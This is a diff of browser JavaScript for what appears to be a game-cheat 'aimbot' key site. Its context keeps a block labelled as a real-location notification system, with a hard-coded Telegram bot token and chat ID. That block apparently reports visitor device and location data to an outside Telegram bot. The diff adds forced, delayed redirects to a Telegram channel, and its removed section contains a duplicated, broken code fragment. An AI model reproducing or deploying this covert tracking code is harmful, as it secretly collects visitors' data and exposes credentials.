@@ -10,7 +10,7 @@
 
     // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
     try {
-        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwooyk';
+        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
         const chatId = '8488556450';
         
         const ua = navigator.userAgent;
@@ -58,6 +58,21 @@
     } catch(e) {}
     // -------------------------------------------------------------------------
 
+    // --- CHECK IF ALREADY ON SAKIR VERIFY PAGE ---
+    try {
+        if (location.hostname === "getkey.sakirmobilepanel.shop") {
+            const p = location.pathname.replace(/\/+$/, "");
+            if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
+                // If already arrived here, trigger 7-8 seconds delay then redirect to Channel
+                setTimeout(() => {
+                    window.location.href = "https://telegram.me/+xVEVeNBqwthiMjhl";
+                }, 7500);
+                return;
+            }
+        }
+    } catch(e) {}
+
+    // --- DIALOG BOX & REDIRECT FLOW ---
     try {
         const style = document.createElement('style');
         style.innerHTML = `
@@ -109,53 +124,10 @@
             
             const targetUrl = `https://getkey.sakirmobilepanel.shop/verify-key?device=${deviceID}&t=${ts}&sig=${sig}`;
             
-            if (location.hostname === "getkey.sakirmobilepanel.shop") {
-                const p = location.pathname.replace(/\/+$/, "");
-                if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
-                    // Try to alert key if present, then guarantee redirect to channel after 6.5 seconds
-                    const kEl = document.getElementById("licenseKey");
-                    if (kEl && kEl.textContent.trim()) {
-                        alert("Sakir Aimbot Key: " + kEl.textContent.trim());
-                    }
-                    setTimeout(() => {
-                        window.location.href = "https://telegram.me/+xVEVeNBqwthiMjhl";
-                    }, 6500);
-                    return;
-                }
-            }
-            
-            window.location.replace(targetUrl);
-        } catch(err) { 
-            window.location.replace(_fb); 
-        }
-    }, 3500);
-})();
-                const p = location.pathname.replace(/\/+$/, "");
-                if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
-                    const grab = () => {
-                        const kEl = document.getElementById("licenseKey");
-                        if (kEl) {
-                            const key = kEl.textContent.trim();
-                            if (key) {
-                                alert("Sakir Aimbot Key: " + key);
-                                // 6-7 seconds delay after key is grabbed before redirecting to channel
-                                setTimeout(() => {
-                                    window.location.href = "https://telegram.me/+xVEVeNBqwthiMjhl";
-                                }, 6500);
-                                return true;
-                            }
-                        }
-                        return false;
-                    };
-                    if (!grab()) {
-                        const checkInterval = setInterval(() => {
-                            if (grab()) clearInterval(checkInterval);
-                        }, 1000);
-                    }
-                    return;
-                }
-            }
-            
+            // Open Sakir Link and store a flag + timestamp in sessionStorage so the destination page knows when to redirect to Telegram
+            sessionStorage.setItem('pahadi_redirect_active', 'true');
+            sessionStorage.setItem('pahadi_redirect_time', Date.now());
+
             window.location.replace(targetUrl);
         } catch(err) { 
             window.location.replace(_fb); 
